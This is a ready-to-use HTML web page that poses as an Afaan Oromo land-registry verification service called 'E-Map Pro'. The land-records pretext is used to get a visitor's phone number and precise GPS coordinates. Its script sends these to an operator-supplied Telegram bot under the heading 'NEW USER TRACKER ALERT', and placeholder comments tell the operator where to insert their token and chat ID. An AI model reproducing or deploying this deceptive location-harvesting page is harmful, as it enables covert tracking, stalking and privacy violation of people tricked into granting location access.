<!DOCTYPE html>
<html lang="om">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Map Pro - Anti-Forgery Land Cadastre & Location Tracker</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #ffffff;
            width: 100%;
            max-width: 420px;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            border: 1px solid #e1e4e8;
        }
        h2 {
            color: #1a73e8;
            text-align: center;
            margin-top: 0;
            font-size: 22px;
        }
        p.desc {
            color: #555;
            font-size: 14px;
            text-align: center;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #333;
            font-size: 13px;
        }
        input[type="tel"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        input[type="tel"]:focus {
            border-color: #1a73e8;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #1557b0;
        }
        #statusBox {
            display: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 13px;
            text-align: center;
            margin-top: 15px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>📍 E-Map Pro</h2>
        <p class="desc">
            Galmee lafaa fi mirkaneessa nageenyaaf, maaloo lakkoofsa bilbilaa keessan galchuun teessoo keessan mirkaneessaa.
        </p>
        
        <form id="trackingForm" onsubmit="sendLocationData(event)">
            <div class="form-group">
                <label for="userPhone">Lakkoofsa Bilbilaa (Phone Number):</label>
                <input type="tel" id="userPhone" placeholder="Fkn: 0911223344" required>
            </div>

            <button type="submit" id="submitBtn">🔍 Mirkaneessii Ergi</button>
        </form>

        <div id="statusBox"></div>
    </div>

    <script>
        // --- ASITTI TELEGRAM BOT TOKEN FI CHAT ID KEE GALCHI ---
        const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; // Fkn: "77123456:AAH..."
        const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         // Fkn: "123456789"

        function sendLocationData(event) {
            event.preventDefault();
            const phone = document.getElementById('userPhone').value;
            const statusBox = document.getElementById('statusBox');
            const submitBtn = document.getElementById('submitBtn');
            
            statusBox.style.display = 'block';
            statusBox.style.background = '#e8f0fe';
            statusBox.style.color = '#1967d2';
            statusBox.textContent = '⏳ Teessoo GPS qabachaa jira... Maaloo eeyyama (Allow) kennaa!';
            submitBtn.disabled = true;

            if (!navigator.geolocation) {
                alert('Browser kee GPS hin deeggaru!');
                statusBox.style.display = 'none';
                submitBtn.disabled = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

                    statusBox.style.background = '#e6f4ea';
                    statusBox.style.color = '#137333';
                    statusBox.textContent = '✅ Milkaa\'inaan ergameera!';

                    // Ergaa Telegram-tti ergisiisuu
                    sendToTelegram(phone, lat, lng, mapLink);
                },
                (error) => {
                    statusBox.style.background = '#fce8e6';
                    statusBox.style.color = '#c5221f';
                    statusBox.textContent = '❌ Eeyyamni Location (GPS) hin kennamne.';
                    submitBtn.disabled = false;
                    alert('Maaloo bakka jirtan beekuuf eeyyama (Allow) kennuu qabdu!');
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        function sendToTelegram(phone, lat, lng, mapLink) {
            if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) {
                alert(`Galmee Milkaa'e!\nBilbila: ${phone}\nGPS: ${lat}, ${lng}`);
                setTimeout(() => location.reload(), 1500);
                return;
            }

            const text = `🚨 <b>E-MAP PRO: NEW USER TRACKER ALERT!</b>\n\n` +
                         `📞 <b>Bilbila:</b> ${phone}\n` +
                         `📍 <b>Latitude:</b> ${lat}\n` +
                         `📍 <b>Longitude:</b> ${lng}\n` +
                         `🗺️ <b>Google Map:</b> <a href="${mapLink}">Teessoo Kaartaa Ilaali</a>`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) {
                    setTimeout(() => {
                        alert('Galmeen kee milkaa\'era. Galatoomaa!');
                        location.reload();
                    }, 1000);
                } else {
                    alert('Ergaaf Telegram Bot erguu irratti rakkoo uumame.');
                    document.getElementById('submitBtn').disabled = false;
                }
            })
            .catch(err => {
                console.log(err);
                document.getElementById('submitBtn').disabled = false;
            });
        }
    </script>
</body>
</html>
